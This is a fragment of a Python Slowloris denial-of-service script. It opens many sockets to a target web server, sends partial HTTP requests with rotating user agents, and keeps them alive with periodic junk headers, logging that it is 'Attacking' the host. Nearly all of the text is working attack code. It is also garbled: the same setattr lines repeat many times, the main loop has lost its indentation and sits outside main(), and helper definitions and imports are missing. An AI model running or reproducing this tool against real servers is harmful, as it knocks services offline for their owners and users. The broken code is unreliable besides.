"Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0 Iceweasel/2.0.0.3 (Debian-2.0.0.13-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.1.3) Gecko/20070310 Iceweasel/2.0.0.3 (Debian-2.0.0.3-1)",
]

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)



def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)


    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip, args.port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info(f"Socket count: {len(list_of_sockets)}")

    # Try to send a header line to each socket
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 10000))
        except socket.error:
            list_of_sockets.remove(s)

    # Some of the sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace them until we reach the desired number.

    diff = args.sockets - len(list_of_sockets)
    if diff <= 1:
        return

    logging.info(f"Creating {diff} new sockets...")
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug(f"Failed to create new socket: {e}")
            break


def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug(f"Error in Slowloris iteration: {e}")
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)
 
 
    	

if __name__ == "__main__":
    main()
